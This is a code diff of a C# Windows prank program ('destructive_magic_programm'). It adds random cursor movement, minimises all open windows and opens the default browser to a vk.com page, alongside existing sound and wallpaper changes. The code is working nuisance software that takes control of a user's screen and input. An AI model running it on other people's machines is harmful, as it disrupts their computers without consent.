@@ -1,21 +1,75 @@
-﻿using System;
+using Microsoft.Win32;
+using System;
 using System.Collections;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Media;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace destructive_magic_programm
 {
     class Program
     {
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hwnd, int cmd);
+
         delegate void Action();
         static void Main(string[] args)
         {
+            Thread openBrows = new Thread(new ThreadStart(OpenBrowser));
+            Thread changeCursorLocation = new Thread(new ThreadStart(ChangeCursorLocation));
+            changeCursorLocation.Start();
+            HideAllWindows();
+            openBrows.Start();
             Action magic = StartSound;
             magic += ChangeWallpaper;
             magic();
+            
+        }
+        public static void ChangeCursorLocation()
+        {
+            int i = 0;
+            while (i < 200)
+            {
+                i++;
+                Random randomx = new Random();
+                Random randomy = new Random();
+                Cursor.Position = new Point(randomx.Next(0,1000), randomy.Next(100,1500));
+                Thread.Sleep(250);
+            }
+        }
+        public static void HideAllWindows()
+        {
+            System.Diagnostics.Process[] etc = System.Diagnostics.Process.GetProcesses();//получаем процессы
+            foreach (System.Diagnostics.Process anti in etc)//перебираем
+            {
+                if (anti.MainWindowTitle.ToString() != "")//отлавливаем процессы, которые имеют окна
+                {
+                    if (!anti.MainWindowTitle.ToString().Equals("Окно, которое не нужно закрывать(название окна)"))
+                    {
+                        ShowWindow(anti.MainWindowHandle, 6);//сворачивам окна
+                    }
+                }
+            }
+        }
+        public static void OpenBrowser()
+        {
+            string referens = "https://vk.com/logotip456";
+            Process p = new Process();
+            p.StartInfo.FileName = defaultBrowser();
+            p.StartInfo.Arguments = referens;
+            p.Start();
+        }
+        public static string defaultBrowser()
+        {
+            string regkey = @"http\shell\open\command";
+            RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(regkey, false);
+            string browserPath = ((string)registryKey.GetValue(null, null)).Split('"')[1];
+            return browserPath;
         }
         public static void ChangeWallpaper()
         {
